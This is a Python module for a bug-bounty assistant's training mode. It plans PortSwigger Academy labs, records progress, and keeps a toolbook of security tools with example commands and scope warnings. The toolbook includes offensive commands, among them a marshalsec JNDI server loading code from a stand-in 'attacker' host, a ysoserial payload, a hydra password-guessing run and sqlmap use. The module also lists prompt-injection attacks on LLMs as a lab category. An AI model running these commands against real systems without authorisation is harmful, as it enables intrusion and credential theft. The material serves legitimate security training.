"""Training mode: PortSwigger Academy labs, progress, and tool knowledge.

Training is deliberately separate from hunting. A lab is a known-vulnerable
teaching target; a bug bounty target is not. The catalogue is a public snapshot
of the Academy lab index, and progress is only recorded from an explicit
operator/agent result with evidence and a written lesson.
"""

from __future__ import annotations

import json
from functools import lru_cache
from pathlib import Path

CATALOG_PATH = Path(__file__).with_name("data") / "portswigger_labs.json"
DIFFICULTY_ORDER = {"apprentice": 0, "practitioner": 1, "expert": 2, "unknown": 3}

CATEGORY_TAGS = {
    "SQL injection": ["sqli", "database"],
    "NoSQL injection": ["sqli", "mongodb"],
    "Cross-site scripting": ["xss", "javascript"],
    "DOM-based vulnerabilities": ["xss", "javascript", "dom"],
    "Cross-site request forgery (CSRF)": ["csrf", "auth"],
    "Clickjacking": ["clickjacking", "ui"],
    "Cross-origin resource sharing (CORS)": ["cors", "api"],
    "XML external entity (XXE) injection": ["xxe", "xml"],
    "Server-side request forgery (SSRF)": ["ssrf", "cloud"],
    "HTTP request smuggling": ["smuggling", "http"],
    "OS command injection": ["rce", "command-injection"],
    "Server-side template injection": ["ssti", "rce"],
    "Path traversal": ["lfi", "filesystem"],
    "Access control vulnerabilities": ["idor", "authz"],
    "Authentication": ["auth", "mfa"],
    "WebSockets": ["websocket", "api"],
    "Web cache poisoning": ["cache", "http"],
    "Web cache deception": ["cache", "http"],
    "Insecure deserialization": ["deserialization", "rce"],
    "Information disclosure": ["infodisclosure", "debug"],
    "Business logic vulnerabilities": ["logic", "business"],
    "Race conditions": ["race", "logic"],
    "File upload vulnerabilities": ["upload", "rce"],
    "API testing": ["api", "rest"],
    "GraphQL API vulnerabilities": ["graphql", "api"],
    "JWT": ["jwt", "auth"],
    "OAuth authentication": ["oauth", "auth"],
    "HTTP Host header attacks": ["host-header", "http"],
    "Prototype pollution": ["prototype-pollution", "javascript"],
    "Web LLM attacks": ["llm", "ai", "prompt-injection"],
    "Essential skills": ["http", "burp"],
}

GUIDES = {
    "injection": {
        "focus": "Find the parser boundary, then prove one controlled difference.",
        "tools": ["Burp Repeater", "sqlmap", "commix", "SSTImap", "curl"],
        "checks": ["quote and comment probes", "boolean differential",
                   "time delay only when needed", "error text and stack traces"],
    },
    "client": {
        "focus": "Trace the source to the sink and prove execution in a browser.",
        "tools": ["Burp Repeater", "browser DevTools", "dalfox", "XSStrike"],
        "checks": ["reflection context", "encoding and sanitisation",
                   "DOM source-to-sink path", "CSP and cookie flags"],
    },
    "auth": {
        "focus": "Map every state transition and compare two owned accounts.",
        "tools": ["Burp Repeater", "jwt_tool", "browser profiles", "curl"],
        "checks": ["object ownership", "role checks on the server",
                   "token audience and signature", "MFA step coverage"],
    },
    "server": {
        "focus": "Test what the server fetches, parses, or trusts.",
        "tools": ["Burp Collaborator", "curl", "ffuf", "tcpdump"],
        "checks": ["out-of-band callback", "path normalisation",
                   "parser differential", "error and timing differences"],
    },
    "api": {
        "focus": "Read the schema, then test object and field authorization.",
        "tools": ["Burp Repeater", "graphql-cop", "clairvoyance", "curl"],
        "checks": ["introspection", "field-level auth", "mass assignment",
                   "versioned and undocumented routes"],
    },
    "logic": {
        "focus": "Model the intended workflow before trying to break it.",
        "tools": ["Burp Repeater", "Turbo Intruder", "curl"],
        "checks": ["negative and fractional values", "step skipping",
                   "coupon and refund state", "concurrent requests"],
    },
    "advanced": {
        "focus": "Prove a parser or cache differential with a minimal request pair.",
        "tools": ["Burp Repeater", "smuggler", "h2csmuggler", "curl"],
        "checks": ["front-end vs back-end parsing", "cache key",
                   "connection reuse", "response queue timing"],
    },
}


def _guide_group(category: str) -> str:
    name = category.lower()
    if any(word in name for word in ("sql", "nosql", "command", "template", "xxe",
                                     "deserialization", "prototype")):
        return "injection"
    if any(word in name for word in ("script", "csrf", "clickjacking", "cors",
                                     "dom", "websocket", "llm")):
        return "client"
    if any(word in name for word in ("access", "authentication", "jwt", "oauth")):
        return "auth"
    if any(word in name for word in ("api", "graphql")):
        return "api"
    if any(word in name for word in ("business", "race")):
        return "logic"
    if any(word in name for word in ("smuggling", "cache", "host header")):
        return "advanced"
    return "server"


@lru_cache(maxsize=1)
def catalog() -> tuple[dict, ...]:
    try:
        raw = json.loads(CATALOG_PATH.read_text())
    except (OSError, ValueError):
        return ()
    return tuple(item for item in raw if item.get("slug") and item.get("title"))


def find_lab(slug: str) -> dict | None:
    for lab in catalog():
        if lab["slug"] == slug:
            return lab
    return None


def _progress_map(index) -> dict[str, dict]:
    return {row["lab_slug"]: row for row in index.list_training()}


def _lab_payload(lab: dict, guide: dict, progress: dict | None) -> dict:
    return {
        "slug": lab["slug"],
        "title": lab["title"],
        "category": lab["category"],
        "difficulty": lab.get("difficulty", "unknown"),
        "url": lab["url"],
        "status": (progress or {}).get("status", "new"),
        "attempts": (progress or {}).get("attempts", 0),
        "focus": guide["focus"],
        "tools": guide["tools"],
        "checks": guide["checks"],
        "tags": CATEGORY_TAGS.get(lab["category"], []),
    }


def plan(index, category: str = "", difficulty: str = "", limit: int = 5) -> dict:
    """Pick the next labs.

    The default plan is breadth-first: rotate across categories, prefer an
    in-progress lab, then apprentice before practitioner before expert. This
    builds transferable technique instead of grinding one category.
    """
    labs = catalog()
    if not labs:
        return {"items": [], "total": 0,
                "note": "The bundled lab catalogue is empty."}
    limit = max(1, min(int(limit), 25))
    progress = _progress_map(index)
    if difficulty:
        difficulty = difficulty.strip().lower()
        if difficulty not in DIFFICULTY_ORDER:
            raise ValueError("difficulty must be apprentice, practitioner, or expert")
    filtered = [lab for lab in labs
                if (not category or lab["category"].lower() == category.strip().lower())
                and (not difficulty or lab.get("difficulty") == difficulty)]
    if not filtered:
        return {"items": [], "total": 0,
                "note": "No lab matches that category or difficulty."}

    by_category: dict[str, list[dict]] = {}
    for lab in filtered:
        by_category.setdefault(lab["category"], []).append(lab)
    for items in by_category.values():
        items.sort(key=lambda lab: (DIFFICULTY_ORDER.get(lab.get("difficulty"), 9),
                                    lab["title"].lower()))

    # Categories with less progress come first; within each, the easiest
    # unsolved lab is next. An in-progress lab always wins its category slot.
    ranked = []
    for name, items in by_category.items():
        solved = sum(1 for lab in items
                     if (progress.get(lab["slug"]) or {}).get("status") == "solved")
        in_progress = [lab for lab in items
                       if (progress.get(lab["slug"]) or {}).get("status") == "in_progress"]
        unsolved = [lab for lab in items
                    if (progress.get(lab["slug"]) or {}).get("status") != "solved"]
        next_lab = (in_progress or unsolved or [None])[0]
        if next_lab:
            ranked.append((solved, len(items), name, next_lab))
    ranked.sort(key=lambda row: (row[0], row[1], row[2]))

    items = []
    used = set()
    while len(items) < limit and ranked:
        for solved, total, name, lab in list(ranked):
            if len(items) >= limit:
                break
            if lab["slug"] in used:
                ranked.remove((solved, total, name, lab))
                continue
            used.add(lab["slug"])
            guide = GUIDES[_guide_group(name)]
            items.append(_lab_payload(lab, guide, progress.get(lab["slug"])))
            # Advance this category to its next unsolved lab.
            unsolved = [candidate for candidate in by_category[name]
                        if candidate["slug"] not in used
                        and (progress.get(candidate["slug"]) or {}).get("status") != "solved"]
            ranked.remove((solved, total, name, lab))
            if unsolved:
                ranked.append((solved, total, name, unsolved[0]))
            ranked.sort(key=lambda row: (row[0], row[1], row[2]))
    return {
        "items": items,
        "total": len(items),
        "catalogue": len(labs),
        "solved": sum(1 for lab in labs
                      if (progress.get(lab["slug"]) or {}).get("status") == "solved"),
        "note": ("These are teaching targets. Use a dedicated mission with the "
                 "Academy host in scope; do not reuse a bounty mission."),
    }


def status(index) -> dict:
    labs = catalog()
    progress = _progress_map(index)
    by_category: dict[str, dict] = {}
    by_difficulty: dict[str, dict] = {}
    solved = 0
    for lab in labs:
        name = lab["category"]
        diff = lab.get("difficulty", "unknown")
        state = (progress.get(lab["slug"]) or {}).get("status", "new")
        if state == "solved":
            solved += 1
        for bucket, key in ((by_category, name), (by_difficulty, diff)):
            entry = bucket.setdefault(key, {"total": 0, "solved": 0, "in_progress": 0})
            entry["total"] += 1
            if state == "solved":
                entry["solved"] += 1
            elif state == "in_progress":
                entry["in_progress"] += 1
    return {
        "catalogue": len(labs),
        "solved": solved,
        "coverage": round(solved / len(labs), 4) if labs else 0.0,
        "by_category": dict(sorted(by_category.items())),
        "by_difficulty": dict(sorted(by_difficulty.items())),
        "recent": index.list_training(limit=10),
        "note": ("Progress is explicit. A lab is solved only after a recorded result "
                 "with evidence and a written lesson."),
    }


def record(index, slug: str, status: str, lesson: str = "", evidence: str = "",
           notes: str = "", instance_url: str = "", verified: bool = False,
           technique: str = "", mission_id: str = "") -> dict:
    lab = find_lab(slug)
    if not lab:
        raise ValueError(f"unknown lab: {slug}")
    status = (status or "").strip().lower()
    if status not in {"in_progress", "solved", "blocked", "skipped"}:
        raise ValueError("status must be in_progress, solved, blocked, or skipped")
    if status == "solved":
        if len((evidence or "").strip()) < 8:
            raise ValueError("a solved lab needs evidence (banner text or artifact path)")
        if len((lesson or "").strip()) < 20:
            raise ValueError("a solved lab needs a written lesson of at least 20 characters")
    lesson_id = ""
    if status in {"solved", "blocked"} and lesson:
        outcome = "success" if status == "solved" else "blocked"
        created = index.add_lesson(
            title=f"PortSwigger lab {status}: {lab['title']}",
            lesson=lesson,
            technique=technique or lab["category"],
            context=f"PortSwigger Academy {lab['category']} ({lab.get('difficulty')})",
            outcome=outcome,
            next_step=notes,
            tags=CATEGORY_TAGS.get(lab["category"], []),
            mission_id=mission_id,
            source=f"training:{lab['slug']}",
            confidence=0.8 if status == "solved" else 0.5,
        )
        lesson_id = created["id"]
    row = index.record_training(
        slug, lab["category"], lab.get("difficulty", "unknown"), status,
        instance_url=instance_url, evidence=evidence, notes=notes,
        verified=verified, lesson_id=lesson_id)
    return {"lab": lab, "progress": row,
            "note": ("Skipped and in-progress records do not create a lesson. "
                     "A solved record requires both evidence and a lesson.")}


def verify_signal(body: str) -> bool:
    """PortSwigger prints a congratulations banner on a solved lab."""
    text = (body or "").lower()
    return ("congratulations" in text and "solved" in text) or "lab solved" in text


TOOLBOOK = [
    {
        "name": "burp-suite",
        "category": "intercept",
        "summary": "The manual workbench: proxy history, Repeater, Intruder, Decoder, Collaborator.",
        "use_when": "Any request you need to replay, mutate, compare, or send out-of-band.",
        "command": "burpsuite (GUI) or the NetCast3r Burp MCP bridge",
        "notes": "Repeater is for one precise change; Intruder is for a bounded matrix. Collaborator proves blind SSRF and blind injection.",
    },
    {
        "name": "curl",
        "category": "http",
        "summary": "Low-level HTTP client that makes every header and byte explicit.",
        "use_when": "Reproducing a request, testing methods, headers, encodings, and redirects.",
        "command": "curl -i -sS -X POST 'https://target/path' -H 'Content-Type: application/json' --data '{}'",
        "notes": "Use --path-as-is to stop curl normalising traversal, and -D - to show response headers.",
    },
    {
        "name": "httpx",
        "category": "recon",
        "summary": "Fast HTTP probing with status, title, TLS, and technology fingerprints.",
        "use_when": "Turning a subdomain list into live web services.",
        "command": "httpx -u https://target -silent -status-code -title -tech-detect",
        "notes": "A fingerprint is a lead, not a finding. Confirm the version before matching a CVE.",
    },
    {
        "name": "ffuf",
        "category": "fuzz",
        "summary": "Fast content and parameter discovery with a wordlist.",
        "use_when": "Finding hidden routes, parameters, backups, and virtual hosts.",
        "command": "ffuf -u https://target/FUZZ -w wordlist.txt -mc all -fs 0",
        "notes": "Cap the rate on shared infrastructure. Compare response size, words, and status, not status alone.",
    },
    {
        "name": "feroxbuster",
        "category": "fuzz",
        "summary": "Recursive content discovery with sensible filters.",
        "use_when": "Mapping a large web root where recursion is useful.",
        "command": "feroxbuster -u https://target -w wordlist.txt --rate-limit 20",
        "notes": "Disable recursion when the target publishes rate limits; a 429 is a stop signal.",
    },
    {
        "name": "gobuster",
        "category": "fuzz",
        "summary": "Directory, DNS, and vhost brute force with small output.",
        "use_when": "A quick directory or vhost sweep with a known wordlist.",
        "command": "gobuster dir -u https://target -w wordlist.txt -t 10",
        "notes": "Use -k only for a lab with a self-signed certificate, never to hide a production TLS error.",
    },
    {
        "name": "katana",
        "category": "crawl",
        "summary": "Crawler that follows links and parses JavaScript for endpoints.",
        "use_when": "Expanding a known host into routes and parameters.",
        "command": "katana -u https://target -jc -d 3 -silent",
        "notes": "Stay on the registered domain; redirects to a third party are out of scope.",
    },
    {
        "name": "subfinder",
        "category": "recon",
        "summary": "Passive subdomain enumeration from public sources.",
        "use_when": "Starting a wildcard-scope assessment.",
        "command": "subfinder -d target.com -silent",
        "notes": "Passive only. A subdomain is in scope only if the programme says so.",
    },
    {
        "name": "amass",
        "category": "recon",
        "summary": "Deeper DNS and asset mapping with active and passive modes.",
        "use_when": "A large scope where subfinder is not enough.",
        "command": "amass enum -passive -d target.com",
        "notes": "Active mode generates DNS traffic; check the programme rules first.",
    },
    {
        "name": "gau",
        "category": "recon",
        "summary": "Pulls known URLs from public archives.",
        "use_when": "Finding old endpoints, parameters, and JavaScript from the same host.",
        "command": "gau target.com --subs",
        "notes": "Archived URLs may be dead or belong to a third party. Re-check the host and scope.",
    },
    {
        "name": "sqlmap",
        "category": "injection",
        "summary": "SQL injection confirmation and exploitation, including blind and time-based.",
        "use_when": "A parameter is already suspected and a controlled proof is needed.",
        "command": "sqlmap -u 'https://target/item?id=1' --batch --level=1 --risk=1",
        "notes": "Use --technique and --dbms to keep the test narrow. Never dump more data than the proof needs.",
    },
    {
        "name": "commix",
        "category": "injection",
        "summary": "OS command injection confirmation.",
        "use_when": "A parameter reaches a shell and output or timing changes.",
        "command": "commix --url='https://target/ping?host=127.0.0.1' --batch",
        "notes": "Prefer a harmless command such as id or a DNS callback. Do not touch files or persistence.",
    },
    {
        "name": "sstimap",
        "category": "injection",
        "summary": "Server-side template injection detection across engines.",
        "use_when": "User input is rendered by a template engine.",
        "command": "python3 sstimap.py -u 'https://target/?name=*'",
        "notes": "Start with arithmetic probes; escalate only to a read-only engine primitive.",
    },
    {
        "name": "dalfox",
        "category": "xss",
        "summary": "XSS scanner focused on reflected and DOM contexts.",
        "use_when": "A parameter reflects and you need a quick context check.",
        "command": "dalfox url 'https://target/search?q=test' --silence",
        "notes": "A scanner hit is a lead. Prove execution in a real browser before recording a finding.",
    },
    {
        "name": "xsstrike",
        "category": "xss",
        "summary": "XSS payload generation and context analysis.",
        "use_when": "Manual reflection testing with a small payload set.",
        "command": "python3 xsstrike.py -u 'https://target/?q=test'",
        "notes": "Avoid blind payload floods. One context-specific payload with a screenshot is stronger.",
    },
    {
        "name": "nmap",
        "category": "network",
        "summary": "Port and service discovery.",
        "use_when": "A programme explicitly allows infrastructure testing.",
        "command": "nmap -sV -T3 --top-ports 100 target",
        "notes": "Most web programmes exclude port scanning. Check scope before running it.",
    },
    {
        "name": "nikto",
        "category": "web",
        "summary": "Classic web server misconfiguration checks.",
        "use_when": "A legacy host needs a quick configuration review.",
        "command": "nikto -h https://target -maxtime 60",
        "notes": "Noisy and prone to false positives. Verify every hit manually.",
    },
    {
        "name": "whatweb",
        "category": "fingerprint",
        "summary": "Technology and version fingerprinting.",
        "use_when": "Identifying the stack before choosing a technique.",
        "command": "whatweb --color=never --follow-redirect=never https://target",
        "notes": "Fingerprints are hints. Confirm the exact version from a readme or static asset.",
    },
    {
        "name": "wpscan",
        "category": "cms",
        "summary": "WordPress user, plugin, theme, and version enumeration.",
        "use_when": "The target is confirmed WordPress and the programme allows it.",
        "command": "wpscan --url https://target --enumerate vp,vt,u --api-token TOKEN",
        "notes": "Use the API token for vulnerability data. Verify a plugin version before claiming a CVE.",
    },
    {
        "name": "jwt-tool",
        "category": "auth",
        "summary": "JWT decoding, signature tests, and known weak-key checks.",
        "use_when": "A JWT controls identity, role, or tenant.",
        "command": "python3 jwt_tool.py TOKEN -M at",
        "notes": "Test alg=none, key confusion, kid injection, and audience only against your own token.",
    },
    {
        "name": "hashcat",
        "category": "cracking",
        "summary": "GPU/CPU hash cracking for captured hashes.",
        "use_when": "A lab or authorised engagement yields a hash you own.",
        "command": "hashcat -m 0 hashes.txt wordlist.txt",
        "notes": "Cracking third-party credentials is out of scope. Use only hashes created for the test.",
    },
    {
        "name": "john",
        "category": "cracking",
        "summary": "CPU password cracker with many formats.",
        "use_when": "A small hash set needs an offline check.",
        "command": "john --wordlist=wordlist.txt hashes.txt",
        "notes": "Keep the work bounded and never crack data you are not authorised to possess.",
    },
    {
        "name": "hydra",
        "category": "auth",
        "summary": "Online credential testing.",
        "use_when": "A programme explicitly allows credential testing on your own accounts.",
        "command": "hydra -l user -P passwords.txt target https-post-form '/login:user=^USER^&pass=^PASS^:F=invalid'",
        "notes": "Online guessing can lock accounts and is excluded by most programmes. Prefer two owned accounts.",
    },
    {
        "name": "metasploit",
        "category": "exploit",
        "summary": "Exploit framework with modules, payloads, and sessions.",
        "use_when": "A lab or a fully authorised host-level engagement.",
        "command": "msfconsole",
        "notes": "Not a web bug-bounty tool by default. A meterpreter session is not proof of a web finding.",
    },
    {
        "name": "ysoserial",
        "category": "deserialization",
        "summary": "Java deserialization payload generator.",
        "use_when": "A Java serialized object is accepted and a gadget chain is plausible.",
        "command": "java -jar ysoserial.jar CommonsCollections6 'id'",
        "notes": "Use a DNS or sleep payload first. Avoid destructive commands on shared hosts.",
    },
    {
        "name": "marshalsec",
        "category": "deserialization",
        "summary": "JNDI/LDAP/RMI exploitation helper for Java deserialization labs.",
        "use_when": "A JNDI lookup is reachable and a controlled callback is needed.",
        "command": "java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer 'http://attacker/#Exploit'",
        "notes": "Only against a lab or an authorised target. Use your own callback infrastructure.",
    },
    {
        "name": "smuggler",
        "category": "http",
        "summary": "HTTP request smuggling detection and exploitation.",
        "use_when": "A front-end and back-end disagree about request boundaries.",
        "command": "python3 smuggler.py -u https://target",
        "notes": "A timing difference is a lead. Prove a queued response or a cache effect with a minimal pair.",
    },
    {
        "name": "h2csmuggler",
        "category": "http",
        "summary": "HTTP/2 cleartext upgrade smuggling checks.",
        "use_when": "A proxy forwards h2c upgrades to an internal back-end.",
        "command": "python3 h2csmuggler.py -u https://target -x https://target/admin",
        "notes": "Keep the smuggled request read-only and within scope.",
    },
    {
        "name": "mitmproxy",
        "category": "intercept",
        "summary": "Scriptable HTTP proxy for request/response automation.",
        "use_when": "You need repeatable mutations or a custom auth flow.",
        "command": "mitmproxy -p 8080",
        "notes": "Useful for mobile and WebSocket work; pair it with a scoped device proxy.",
    },
    {
        "name": "zap",
        "category": "web",
        "summary": "OWASP Zed Attack Proxy: interception, spider, and passive rules.",
        "use_when": "A free proxy alternative to Burp.",
        "command": "zaproxy -daemon -port 8080",
        "notes": "Passive rules are hints. Active scans need explicit scope and rate limits.",
    },
    {
        "name": "semgrep",
        "category": "code",
        "summary": "Pattern-based static analysis for source code.",
        "use_when": "You have the target's source or an extracted bundle.",
        "command": "semgrep --config auto ./src",
        "notes": "A static hit is not a live finding. Trace the sink and prove reachability.",
    },
    {
        "name": "trufflehog",
        "category": "secrets",
        "summary": "Secret scanning for repositories, files, and images.",
        "use_when": "A public repo or artifact may contain credentials.",
        "command": "trufflehog filesystem ./repo",
        "notes": "Never use a discovered secret beyond the minimum read-only validation.",
    },
    {
        "name": "gitleaks",
        "category": "secrets",
        "summary": "Fast Git history secret scanning.",
        "use_when": "A repository is in scope and history is available.",
        "command": "gitleaks detect --source ./repo",
        "notes": "Rotate anything real through the programme's channel, not in chat.",
    },
    {
        "name": "syft",
        "category": "supply-chain",
        "summary": "SBOM generation for containers and filesystems.",
        "use_when": "Mapping dependencies before CVE review.",
        "command": "syft dir:./app -o json",
        "notes": "Pair with grype or trivy; a vulnerable package is not exploitable until the path is shown.",
    },
    {
        "name": "grype",
        "category": "supply-chain",
        "summary": "Vulnerability matching for an SBOM or image.",
        "use_when": "You have an SBOM and need prioritised CVEs.",
        "command": "grype sbom:./sbom.json",
        "notes": "Confirm the version and the reachable code path.",
    },
    {
        "name": "trivy",
        "category": "supply-chain",
        "summary": "Container, filesystem, and IaC vulnerability scanning.",
        "use_when": "A container image or repo is part of the scope.",
        "command": "trivy image target:latest",
        "notes": "A base-image CVE may not be reachable from the application.",
    },
    {
        "name": "jadx",
        "category": "mobile",
        "summary": "Android APK decompiler.",
        "use_when": "A mobile app is in scope.",
        "command": "jadx -d out app.apk",
        "notes": "Look for endpoints, keys, and exported components; confirm them on the live service.",
    },
    {
        "name": "apktool",
        "category": "mobile",
        "summary": "APK resource decoding and repacking.",
        "use_when": "Manifest, resources, and smali need inspection.",
        "command": "apktool d app.apk -o out",
        "notes": "Read AndroidManifest.xml for exported activities and deep links.",
    },
    {
        "name": "frida",
        "category": "mobile",
        "summary": "Runtime instrumentation for mobile apps.",
        "use_when": "You need to observe or hook a function on a test device.",
        "command": "frida -U -f com.target.app -l hook.js",
        "notes": "Use only on an app you are authorised to test and a device you own.",
    },
    {
        "name": "objection",
        "category": "mobile",
        "summary": "Frida-powered mobile security toolkit.",
        "use_when": "SSL pinning, root detection, or storage checks need a runtime view.",
        "command": "objection -g com.target.app explore",
        "notes": "A bypass is only a finding if it exposes real data or a real auth decision.",
    },
    {
        "name": "pwntools",
        "category": "binary",
        "summary": "Exploit development framework for binaries and CTFs.",
        "use_when": "A binary exploitation lab needs a repeatable harness.",
        "command": "from pwn import *",
        "notes": "Keep it to labs and authorised host-level work.",
    },
    {
        "name": "checksec",
        "category": "binary",
        "summary": "Shows binary hardening: NX, PIE, RELRO, canary.",
        "use_when": "Triaging a binary before exploitation.",
        "command": "checksec --file=./binary",
        "notes": "Hardening gaps are not a vulnerability by themselves.",
    },
    {
        "name": "ghidra",
        "category": "reverse",
        "summary": "NSA's decompiler and reverse-engineering suite.",
        "use_when": "A binary or firmware image needs static analysis.",
        "command": "ghidraRun",
        "notes": "Start from strings, imports, and the main path; do not drown in decompiler output.",
    },
    {
        "name": "radare2",
        "category": "reverse",
        "summary": "Command-line reverse engineering and binary analysis.",
        "use_when": "A quick disassembly or patch check is needed.",
        "command": "r2 -A ./binary",
        "notes": "Pair with rabin2 for imports and strings.",
    },
    {
        "name": "openssl",
        "category": "tls",
        "summary": "TLS certificate inspection and protocol testing.",
        "use_when": "Checking certificate names, expiry, and protocol support.",
        "command": "openssl s_client -connect target:443 -servername target </dev/null",
        "notes": "A certificate mismatch is not automatically a bounty finding; explain the impact.",
    },
    {
        "name": "tcpdump",
        "category": "network",
        "summary": "Packet capture for protocol-level debugging.",
        "use_when": "You need to see what actually left the host or container.",
        "command": "tcpdump -i any -n -s0 port 80 or port 443",
        "notes": "Capture only your own test traffic. Do not retain third-party payloads.",
    },
    {
        "name": "interactsh",
        "category": "oob",
        "summary": "Out-of-band interaction server for blind bugs.",
        "use_when": "Blind SSRF, XXE, SQLi, or RCE needs a callback.",
        "command": "interactsh-client",
        "notes": "A callback proves server-side reachability; it does not by itself prove data impact.",
    },
]


def toolbook(query: str = "", name: str = "") -> dict:
    if name:
        for tool in TOOLBOOK:
            if tool["name"].lower() == name.strip().lower():
                return {"tool": tool,
                        "note": ("Usage notes assume an authorised lab or programme scope. "
                                 "A tool run is not a finding.")}
        return {"tool": None, "note": f"no toolbook entry for {name}"}
    q = (query or "").strip().lower()
    items = TOOLBOOK
    if q:
        items = [tool for tool in TOOLBOOK
                 if q in tool["name"].lower() or q in tool["summary"].lower()
                 or q in tool["category"].lower() or q in tool["use_when"].lower()]
    return {"items": items, "total": len(items),
            "categories": sorted({tool["category"] for tool in TOOLBOOK}),
            "note": ("Usage notes assume an authorised lab or programme scope. "
                     "A tool run is not a finding.")}
